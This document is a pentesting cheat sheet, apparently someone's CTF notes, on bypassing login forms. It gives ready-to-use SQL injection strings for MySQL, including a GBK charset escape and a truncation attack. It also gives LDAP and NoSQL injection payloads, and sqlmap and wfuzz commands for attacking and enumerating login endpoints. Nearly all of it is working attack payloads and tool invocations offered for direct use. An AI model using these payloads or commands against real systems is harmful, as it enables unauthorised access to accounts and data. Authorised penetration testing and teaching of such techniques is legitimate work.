## SQLi

### mysql

`admin' OR 1=1-- `(don't forget the last space in mysql)

- sometimes if you have multiple result it will not work, try

`admin' OR 1=1 LIMIT 1-- `(don't forget the last space in mysql)

- sometimes spaces are filtered, try with a tabulation (%09) 

- you can also replace `--` by `#` if necessary (`%23`)

- `OR` could be replace by `||`

- `1=1` could be just `1`

- GBK is a character set for simplified Chinese. Using the fact that the database driver and the database don't "talk" the same charset, it's possible to generate a single quote and break out of the SQL syntax to inject a payload. Using `\xBF'` url encoded `%bf%27`, you have a single quote that will not get escaped properly. It commes from the execution of this : `SET CHARACTER SET 'GBK';`


## SQL Truncate

- Do not hesitate to retry multiple times

- If the user input value is not validating for its length, then a truncation vulnerability can arise. If the MySQL is running in default mode, Administrator account as admin, the database column is limited to 20 characters.

- Now what’s happening in the backend database? By default, MySQL will truncate longer strings than the defined maximum column width and only emit a warning. But those warnings are usually are seen only in the backend database, not by web applications, and are therefore not handled at all. MySQL does not compare strings in binary mode. By default, more relaxed comparison rules are used. One of these relaxations is that trailing space characters are ignored during the comparison. This means the string ‘admin ‘ is still equal to the string ‘admin’ in the database. And therefore, the application will refuse to accept the new user. If the attacker provides ‘admin ninja’ and the application searches in the database for this user, and it can’t find it because the username column name is limited to 20 characters and the attacker supplied 21 characters, the application will accept the new username and insert into the database. Due to the 20 character column length, the application will truncate the username and insert it as ‘admin ‘. Now the table contains two admin users, ‘admin’ and ‘admin ‘.

- The first thing we know is the default admin account exists, now we check for the username character limit, if there is any limit or not. We verify that the username with 20 characters is able to register. The application is accepting up to 20 characters, and rest of the characters are not accepted. So here we can perform the truncation attack. So again we try to register a user with username ‘admin ninjasecurity’, it is 33 characters and the password is pass@123

- If something is wrong when you submit it from the browser, try to modify it with burp 




https://resources.infosecinstitute.com/sql-truncation-attack/

---

## Bypass auth login

Use the intruder with a payloadallthethings file :
- load payloads in username
- write whatever you want in password field (pass for example)
- check : **size / resp body / code / reason**

Find payloads in this fabulous cheat sheet : https://portswigger.net/web-security/sql-injection/cheat-sheet


---

## MySQL bypass login form

- By default, MySQLL will perform a case insensitive comparison, so admin Admin and AdMin are the same account. When a user is created, the comparison could be done programatically, but when you try to login, the comparison is done by the database. Try to create AdMin !
- Another test: mysql ignores traling space (admin[space])

---

## SQLMap (USE AT YOUR OWN RISK !)

- Intercept your request with burpsuite and then run sqlmap on it : ```sqlmap -level=5 -risk=3 -p username -r \<yourfile\>``` 
- If you manual tested it before and it should work (because you test for example admin and have an input, and admin' -- and the same input) add ```--string='\<message appeared\>'```
- As always, if sqlmap from the repo doesn't work with ```-r```, download from Git.

---

## WFuzz to enumerate the usernames when you detect a specific message  

- ```wfuzz -c -z file,SecLists/Usernames/Names/names.txt --hs "Try again" -d "username=FUZZ&password=anything" http://10.10.10.73/login.php```

---

## LDAP

- Some LDAP servers authorise NULL Bind. Try to remove all the data in the post request to see if you manage to authenticate.

- Knowing the syntax of LDAP, you can try to abuse it : `username=<user>&password=<password>`
(&(username=<user>)(password=<password>))
So, to bypass this :
(&(username=test)(cn=*)NULL byte)
`hacker)(cn=*))%00`

- Try also just * in login and password

https://book.hacktricks.xyz/pentesting-web/ldap-injection

---

## What can it be ?

- MySQL
- MSSQL
- NoSQL (MongoDB, for example for a login bypass : `' || 1==1%00'`
) (To comment the end : `%00`, `//`, `<!--`)
- XPATH

For each one, refer to the cheat sheet.

